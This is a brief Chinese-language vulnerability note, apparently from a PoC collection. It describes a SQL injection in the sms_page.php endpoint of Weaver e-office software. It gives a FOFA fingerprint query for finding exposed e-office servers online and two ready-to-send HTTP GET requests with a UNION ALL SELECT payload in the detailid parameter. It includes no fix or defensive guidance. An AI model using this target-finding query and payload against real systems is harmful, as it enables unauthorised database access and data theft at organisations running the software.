
# 泛微e-office系统sms_page.php接口存在sql注入漏洞

泛微e-office系统在sms_page.php接口下存在sql注入漏洞

## fofa

```javascript
((header="general/login/index.php" || body="/general/login/view//images/updateLoad.gif"    || (body="szFeatures" && body="eoffice") || header="Server: eOffice") && body!="Server:    couchdb") || banner="general/login/index.php"
```

## poc

```javascript
GET /E-mobile/sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x7e,md5(123),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1
Content-Type: application/json
Host: 127.0.0.1


GET /sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x7e,md5(123),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1
Content-Type: application/json
Host: 127.0.0.1


```
